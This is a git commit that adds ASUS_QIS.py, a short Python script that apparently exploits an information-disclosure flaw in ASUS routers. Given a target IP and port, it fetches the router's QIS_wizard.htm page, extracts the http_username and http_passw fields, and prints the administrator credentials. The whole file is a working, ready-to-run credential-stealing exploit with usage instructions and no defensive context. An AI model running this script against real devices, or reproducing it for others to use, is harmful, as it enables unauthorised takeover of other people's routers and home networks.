446d58d06175556d06c129cb5a0124f394c05bf2
0xBFFFF0A4 <0xBFFFF0A4@protonmail.com>
2017-10-05 00:53:32 +0500

    Add files via upload

---
+++ ASUS_QIS.py
@@ -0,0 +1,44 @@
+from urllib.request import urlopen
+from sys import argv
+
+def GetData():
+
+    try:
+
+        URI = "http://"+HOST+":"+PORT+"/QIS_wizard.htm"
+        html = urlopen(URI).read()
+    
+    except:
+
+        print("\t[!] Vulnerable file is not found!\n\t[+] Exiting...")
+        exit(0)
+
+    for line in html.split(b"\n"):
+
+        if b'http_username' in line:
+
+            print("\t[+] Host %s username: %s" % (HOST, line.decode("utf-8").split('value="')[1].split('">')[0]))
+
+        elif b'http_passw' in line:
+
+            print("\t[+] Host %s password: %s" % (HOST, line.decode("utf-8").split('value="')[1].split('">')[0]))
+
+            
+
+
+def ArgParse():
+
+    try:
+
+        global HOST, PORT
+        HOST = argv[1]
+        PORT = argv[2]
+        print('\n\t[+] Set target %s:%s' % (HOST, PORT))
+
+    except IndexError:
+
+        print('\n\tUsage: %s [IP] [PORT]' % argv[0])
+        exit(0)
+
+ArgParse()
+GetData()
